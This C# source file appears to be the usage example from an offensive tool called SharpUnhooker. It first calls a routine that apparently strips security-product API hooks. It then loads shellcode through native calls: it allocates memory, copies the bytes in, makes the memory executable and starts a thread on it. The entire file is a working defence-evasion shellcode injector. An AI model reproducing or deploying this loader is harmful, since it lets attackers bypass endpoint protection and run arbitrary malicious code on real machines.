using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Text;
using static SharpUnhooker.Win32;

namespace SharpUnhooker
{
    public class SUUsageExample
    {

        internal static void UsageExample(byte[] ShellcodeBytes)
        {
            SharpUnhooker.Run();
            IntPtr ProcessHandle = new IntPtr(-1); // pseudo-handle for current process
            IntPtr ShellcodeBytesLength = new IntPtr(ShellcodeBytes.Length);
            IntPtr AllocationAddress = new IntPtr();
            IntPtr ZeroBitsThatZero = IntPtr.Zero;
            UInt32 AllocationTypeUsed = (UInt32)AllocationType.Commit | (UInt32)AllocationType.Reserve;
            Console.WriteLine("[*] Allocating memory...");
            NtAllocateVirtualMemory(ProcessHandle, ref AllocationAddress, ZeroBitsThatZero, ref ShellcodeBytesLength, AllocationTypeUsed, 0x04);
            Console.WriteLine("[*] Copying Shellcode...");
            Marshal.Copy(ShellcodeBytes, 0, AllocationAddress, ShellcodeBytes.Length);
            Console.WriteLine("[*] Changing memory protection setting...");
            UInt32 newProtect = 0;
            NtProtectVirtualMemory(ProcessHandle, ref AllocationAddress, ref ShellcodeBytesLength, 0x20, ref newProtect);
            IntPtr threadHandle = new IntPtr(0);
            ACCESS_MASK desiredAccess = ACCESS_MASK.SPECIFIC_RIGHTS_ALL | ACCESS_MASK.STANDARD_RIGHTS_ALL; // logical OR the access rights together
            IntPtr pObjectAttributes = new IntPtr(0);
            IntPtr lpParameter = new IntPtr(0);
            bool bCreateSuspended = false;
            int stackZeroBits = 0;
            int sizeOfStackCommit = 0xFFFF;
            int sizeOfStackReserve = 0xFFFF;
            IntPtr pBytesBuffer = new IntPtr(0);
            // create new thread
            Console.WriteLine("[*] Creating new thread to execute the Shellcode...");
            NtCreateThreadEx(out threadHandle, desiredAccess, pObjectAttributes, ProcessHandle, AllocationAddress, lpParameter, bCreateSuspended, stackZeroBits, sizeOfStackCommit, sizeOfStackReserve, pBytesBuffer);
            Console.WriteLine("[+] Thread created with handle {0}! Sh3llc0d3 executed!", threadHandle.ToString("X4"));
        }
    }

}
